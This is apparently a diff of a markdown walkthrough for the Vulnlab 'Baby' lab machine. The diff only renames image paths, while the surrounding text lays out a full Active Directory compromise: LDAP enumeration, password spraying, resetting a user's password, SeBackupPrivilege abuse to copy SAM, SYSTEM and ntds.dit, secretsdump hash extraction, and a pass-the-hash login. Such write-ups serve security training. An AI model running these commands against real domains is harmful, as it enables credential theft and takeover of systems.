@@ -20,7 +20,7 @@ We started executing a full port scan on the host.
 ╰─ $ sudo nmap -v -sS -Pn -p- 10.10.98.130 --min-rate=300 --max-rate=500
 ```
 
-![Untitled](baby/Untitled.png)
+![Untitled](Untitled.png)
 
 Now, we execute a port scan only on the open ports that we have found before.
 
@@ -29,13 +29,13 @@ Now, we execute a port scan only on the open ports that we have found before.
 ╰─ $ sudo nmap -vv -sV -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,9389 -oA nmap/baby 10.10.98.130
 ```
 
-![Untitled](baby/Untitled%201.png)
+![Untitled](Untitled%201.png)
 
-![Untitled](baby/Untitled%202.png)
+![Untitled](Untitled%202.png)
 
 We found the machine name, the domain, and the domain controller name, so we write it into our local hosts file.
 
-![Untitled](baby/Untitled%203.png)
+![Untitled](Untitled%203.png)
 
 Now, we execute the `netexec` tool to enumerate the SMB service. We could verify that we can log into the SMB as anonymous.
 
@@ -48,7 +48,7 @@ Now, we execute the `netexec` tool to enumerate the SMB service. We could verify
 ╰─ $ netexec smb baby.vl -u "" -p "" --shares
 ```
 
-![Untitled](baby/Untitled%204.png)
+![Untitled](Untitled%204.png)
 
 But we couldn’t list any shares anonymously. So we try enumerating users with `kerbrute`, also without success. Finally, we enumerate the LDAP service using the `ldapsearch` tool. We could enumerate the accounts that were created on the host, and the default password when a new user is created.
 
@@ -57,17 +57,17 @@ But we couldn’t list any shares anonymously. So we try enumerating users with 
 ╰─ $ ldapsearch -H ldap://10.10.98.130 -x -b "DC=baby,DC=vl"
 ```
 
-![Dev Users](baby/Untitled%205.png)
+![Dev Users](Untitled%205.png)
 
 Dev Users
 
-![IT Users](baby/Untitled%206.png)
+![IT Users](Untitled%206.png)
 
 IT Users
 
 The Teresa.Bell user has a description field saying “Set the initial password to BabyStart123!”.
 
-![Untitled](baby/Untitled%207.png)
+![Untitled](Untitled%207.png)
 
 We save those all users found on a list of users, after filtering to generate a clean output with only the correct usernames.
 
@@ -80,7 +80,7 @@ First, we check if the `Teresa.Bell` has the initial password like in her descri
 ╰─ $ netexec smb baby.vl -u users.txt -p 'BabyStart123!' --continue-on-success
 ```
 
-![Untitled](baby/Untitled%208.png)
+![Untitled](Untitled%208.png)
 
 We could verify the `Caroline.Robinson` user did not change her password. Using the `smbpasswd` tool, we can change the initial password and redefine to one of our choice.
 
@@ -89,7 +89,7 @@ We could verify the `Caroline.Robinson` user did not change her password. Using 
 ╰─[☢] $ smbpasswd -r baby.vl -U caroline.robinson
 ```
 
-![Untitled](baby/Untitled%209.png)
+![Untitled](Untitled%209.png)
 
 Now, we check if the password really has been changed.
 
@@ -98,7 +98,7 @@ Now, we check if the password really has been changed.
 ╰─ $ netexec smb baby.vl -u caroline.robinson -p 'hacker@123'
 ```
 
-![Untitled](baby/Untitled%2010.png)
+![Untitled](Untitled%2010.png)
 
 We were able to change the `caroline.robinson`’s password. Now we can log into WinRM service as this user.
 
@@ -107,7 +107,7 @@ We were able to change the `caroline.robinson`’s password. Now we can log into
 ╰─ $ evil-winrm -i 10.10.98.130 -u caroline.robinson -p 'hacker@123'
 ```
 
-![Untitled](baby/Untitled%2011.png)
+![Untitled](Untitled%2011.png)
 
 ## Privilege Escalation
 
@@ -117,7 +117,7 @@ Checking the privileges for `caroline.robinson` account, we verify she has the `
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv
 ```
 
-![Untitled](baby/Untitled%2012.png)
+![Untitled](Untitled%2012.png)
 
 With this privilege, we can save the SAM database and de SYSTEM file to retrieve the NTLM hashes for the users.
 
@@ -126,7 +126,7 @@ With this privilege, we can save the SAM database and de SYSTEM file to retrieve
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system system
 ```
 
-![Untitled](baby/Untitled%2013.png)
+![Untitled](Untitled%2013.png)
 
 Now we download these files to our local machine.
 
@@ -135,7 +135,7 @@ Now we download these files to our local machine.
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download system
 ```
 
-![Untitled](baby/Untitled%2014.png)
+![Untitled](Untitled%2014.png)
 
 We were able to retrieve the NTLM hashes for the users locally using the secretsdump impacket tool.
 
@@ -144,7 +144,7 @@ We were able to retrieve the NTLM hashes for the users locally using the secrets
 ╰─ $ impacket-secretsdump -sam sam -system system LOCAL
 ```
 
-![Untitled](baby/Untitled%2015.png)
+![Untitled](Untitled%2015.png)
 
 We could not log into WinRM using the Administrator’s hash retrieved before, because this hash is for the local Administrator user, not the Administrator DC user. So we have to retrieve the administrator DC user that is saved in the ntds.dit file. First, we try to create a ***shadow copy*** of the `C:` drive using the `vssadmin` tool, but we do not have permissions to execute it. We tried some other techniques without success.
 
@@ -176,7 +176,7 @@ Now, we execute the diskshadow tool to execute our script.
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s script.txt
 ```
 
-![Untitled](baby/Untitled%2016.png)
+![Untitled](Untitled%2016.png)
 
 Now we copied the `ntds.dit` file from the new drive, (`E:`), created above.
 
@@ -184,18 +184,18 @@ Now we copied the `ntds.dit` file from the new drive, (`E:`), created above.
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\ntds . ntds.dit
 ```
 
-![Untitled](baby/Untitled%2017.png)
+![Untitled](Untitled%2017.png)
 
 Finally, we download the `ntds.dit` file to our local machine and execute the secretsdump tool to retrieve the Administrator’s DC hash.
 
-![Untitled](baby/Untitled%2018.png)
+![Untitled](Untitled%2018.png)
 
 ```bash
 ╭─[us-free-3]-[10.8.2.220]-[th3g3ntl3m4n@kali]-[~/vulnlab/baby]
 ╰─ $ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 ```
 
-![Untitled](baby/Untitled%2019.png)
+![Untitled](Untitled%2019.png)
 
 We now just log into the WinRM service as Administrator using the ***Pass-The-Hash (PTH)*** technique.
 
@@ -204,4 +204,4 @@ We now just log into the WinRM service as Administrator using the ***Pass-The-Ha
 ╰─ $ evil-winrm -i 10.10.98.130 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
 ```
 
-![Untitled](baby/Untitled%2020.png)
+![Untitled](Untitled%2020.png)
